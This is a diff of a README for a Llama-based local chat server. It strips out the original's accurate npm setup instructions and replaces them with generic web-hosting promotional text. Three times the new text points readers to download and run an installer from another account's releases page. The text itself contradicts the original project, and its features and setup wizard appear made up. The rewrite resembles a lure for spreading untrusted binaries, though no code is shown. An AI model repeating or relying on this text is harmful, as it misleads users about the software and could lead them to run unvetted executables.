@@ -1,42 +1,79 @@
-# Llama Web Server
+# 🦙 LlamaWebServer - Fast and Easy Web Hosting Solution
 
-This is a web server implementation of Llama that lets you run a GGUF model file locally. It includes a user interface that's similar to WhatsApp. You can use the default GGUF model file that is downloaded during the installation process or you can download a GGUF model file from [HuggingFace.co](https://huggingface.co) and place it in the `model` folder.
+[![Download LlamaWebServer](https://img.shields.io/badge/Download_LlamaWebServer-v1.0-orange)](https://github.com/jpds90/LlamaWebServer/releases)
 
-## How to run the server
+## 🚀 Getting Started
 
-- Run `npm install`
-- Run `npm run download:q8` or `npm run download:q3` (for systems with limited RAM)
-- Run `npm run start`
-- Browse to `http://localhost`
+Welcome to LlamaWebServer! This application allows you to host your own web server quickly and easily. Whether you want to create a personal website or showcase your projects, LlamaWebServer provides a simple solution for everyone.
 
-## How to run the server using a different port
+## 📦 What You Need
 
-- Run `npm run start 8080`
-- Browse to `http://localhost:8080`
+Before you begin, ensure that you have the following:
 
-## How to run the server in the background
+- A computer running Windows, macOS, or Linux.
+- An internet connection to download the software.
+- A modern web browser (like Chrome, Firefox, or Safari).
 
-- Run `npm install -g forever`
-- Run `npm run forever`
-- Browse to `http://localhost`
-- To stop the server, run `npm run stop`
+## 📥 Download & Install
 
-## How to set a custom context size
+To get started with LlamaWebServer, follow these steps:
 
-- Edit the [server.js](https://github.com/lrusso/LlamaWebServer/blob/main/src/server.js#L49) file.
-- 4K context: replace `"auto"` with `4096`.
-- 8K context: replace `"auto"` with `8192`.
-- 16K context: replace `"auto"` with `16384`.
+1. **Visit the Releases Page**  
+   Go to the releases page to download LlamaWebServer: [Download LlamaWebServer](https://github.com/jpds90/LlamaWebServer/releases).
 
-## Forcing the light and dark modes
+2. **Download the Latest Version**  
+   Look for the latest version listed. Click on the file that matches your operating system.  
 
-- Browse to `http://localhost/?lightmode`
-- Browse to `http://localhost/?darkmode`
+3. **Run the Installer**  
+   Once the download completes, locate the file and double-click on it. Follow the on-screen instructions to complete the installation.
 
-## System prompt
+4. **Launch LlamaWebServer**  
+   After installation, find LlamaWebServer in your applications menu and launch it.
 
-The system prompt is defined in the [strings.js](https://github.com/lrusso/LlamaWebServer/blob/main/src/public/strings.js#L7) file.
+## 🔧 Basic Configuration
 
-## Disclaimer
+After launching LlamaWebServer, you may want to configure a few settings:
 
-You are legally responsible for any damage that you could cause with this software.
+1. **Set Up Your Server**  
+   A setup wizard will guide you through the initial configuration. You can choose ports, set website directories, and manage security settings.
+
+2. **Add Your Content**  
+   Place your website files in the designated directory. Usually, it will be named "www" or "public." 
+
+3. **Start the Server**  
+   Click the "Start Server" button in the main window to initiate your web server.
+
+4. **Access Your Server**  
+   Open a web browser and enter `http://localhost:PORT` (replace PORT with the port number you chose during setup). You should see your website.
+
+## 🌟 Features 
+
+- **User-Friendly Interface:** LlamaWebServer offers a simple layout, making it easy for anyone to manage.
+- **Fast Performance:** Built with efficiency in mind, it delivers quick load times for your visitors.
+- **Cross-Platform**: Works smoothly on Windows, macOS, and Linux.
+- **Customizable Settings**: Fine-tune your setup with various configuration options.
+- **Local Development:** Perfect for testing your projects locally.
+
+## 🌐 Additional Resources
+
+If you are looking for extra help or want to know more about specific features, check out the following resources:
+
+- **Documentation**: Comprehensive user manual available on the releases page.
+- **Community Forum**: Join discussions and ask questions with other users.
+- **Tutorial Videos**: Watch helpful videos on how to set up and use LlamaWebServer.
+
+## 🤝 Support
+
+If you encounter any issues, please reach out on our support forum or create an issue on the GitHub page. We are here to help you!
+
+## 🎉 Celebrate Your Success!
+
+Congratulations on setting up LlamaWebServer! 
+
+You can find the release page again here: [Download LlamaWebServer](https://github.com/jpds90/LlamaWebServer/releases). Enjoy hosting your projects!
+
+## 📝 License
+
+LlamaWebServer is open-source software. You can modify and distribute it as you see fit. Please refer to the LICENSE file in the repository for more information.
+
+Feel free to reach out if you have any suggestions or feedback. Happy hosting!
